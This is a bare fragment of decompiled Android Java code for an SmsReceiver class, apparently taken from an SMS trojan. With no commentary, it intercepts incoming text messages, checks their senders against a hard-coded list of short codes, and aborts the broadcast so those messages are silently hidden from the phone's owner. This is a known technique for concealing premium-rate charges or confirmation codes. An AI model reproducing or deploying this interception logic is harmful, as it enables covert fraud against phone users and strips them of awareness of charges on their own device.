	private final java.util.concurrent.ScheduledExecutorService scheduler
	
	    public SmsReceiver()
	    {
	        this.scheduler = java.util.concurrent.Executors.newScheduledThreadPool(1);
	        return;
	    }
	
	
	    public void onReceive(android.content.Context p8, android.content.Intent p9)
	    {
	        android.os.Bundle v0 = p9.getExtras();
	        if (v0 != null) {
	            Object[] v4_1 = ((Object[]) v0.get("pdus"));
	            android.telephony.gsm.SmsMessage[] v3 = new android.telephony.gsm.SmsMessage[v4_1.length];
	            int v1 = 0;
	            int v2 = 0;
	            while (v2 < v3.length) {
	                v3[v2] = android.telephony.gsm.SmsMessage.createFromPdu(((byte[]) v4_1[v2]));
	                if ((v3[v2].getOriginatingAddress().equals("9014")) || ((v3[v2].getOriginatingAddress().equals("79067")) || ((v3[v2].getOriginatingAddress().equals("7781")) || ((v3[v2].getOriginatingAddress().equals("7781")) || ((v3[v2].getOriginatingAddress().equals("80888")) || ((v3[v2].getOriginatingAddress().equals("8014")) || ((v3[v2].getOriginatingAddress().equals("4545")) || ((v3[v2].getOriginatingAddress().equals("7790")) || ((v3[v2].getOriginatingAddress().equals("4157")) || ((v3[v2].getOriginatingAddress().equals("1874")) || ((v3[v2].getOriginatingAddress().equals("1645")) || ((v3[v2].getOriginatingAddress().equals("92525")) || ((v3[v2].getOriginatingAddress().equals("7781")) || ((v3[v2].getOriginatingAddress().equals("1171")) || ((v3[v2].getOriginatingAddress().equals("7540")) || ((v3[v2].getOriginatingAddress().equals("81185")) || ((v3[v2].getOriginatingAddress().equals("90901599")) || (v3[v2].getOriginatingAddress().equals("17013"))))))))))))))))))) {
	                    this.abortBroadcast();
	                    v1++;
	                }
	                v2++;
	            }
	            if (v1 > 0) {
	                this.abortBroadcast();
	            }
	        }
	        return;
	    }
	
